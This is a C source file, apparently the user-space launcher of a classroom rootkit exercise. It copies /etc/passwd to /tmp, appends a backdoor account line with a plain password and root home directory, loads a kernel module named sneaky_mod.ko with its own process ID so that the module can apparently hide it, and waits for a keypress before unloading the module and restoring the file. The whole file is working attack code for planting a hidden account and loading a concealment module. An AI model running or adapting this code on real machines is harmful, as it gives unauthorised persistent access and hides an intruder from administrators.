#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

void copyFile(const char *src, const char *dest)
{
    FILE *s = fopen(src, "a+");
    FILE *d = fopen(dest, "w+");
    char *line_buffer = NULL;
    size_t size = 0;
    size_t n_bytes;

    // read each line from src and write into dest
    while ((n_bytes = getline(&line_buffer, &size, s)) != -1)
    {
        printf("line: %s\n", line_buffer);
        fwrite(line_buffer, n_bytes, 1, d);
    }

    fclose(d);

    // append new line to src
    fseek(s, 0, SEEK_END);
    const char *sneaky_str = "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    fprintf(s, "%s", sneaky_str);
    fclose(s);
}

int main(void)
{
    int sneaky_pid = getpid();
    printf("sneaky_process pid = %d\n", sneaky_pid);

    // Copy /etc/passwd into /tmp/passwd (TODO: replace files)
    copyFile("/etc/passwd", "/tmp/passwd");

    char load_module[100];
    sprintf(load_module, "insmod sneaky_mod.ko sneaky_process_pid=%d", sneaky_pid);
    // printf("Checking dir\n");
    // system("dir");
    // printf("load module sys call: %s\n", load_module);
    system(load_module);

    // read from stdin until q
    printf("entering while loop\n");
    while (1)
    {
        printf("Inside while loop\n");
        char c = getchar();
        if (c == 'q')
        {
            break;
        }
    }

    const char *unload_cmd = "rmmod sneaky_mod.ko";
    system(unload_cmd);
    copyFile("/tmp/passwd", "/etc/passwd");
    return EXIT_SUCCESS;
}
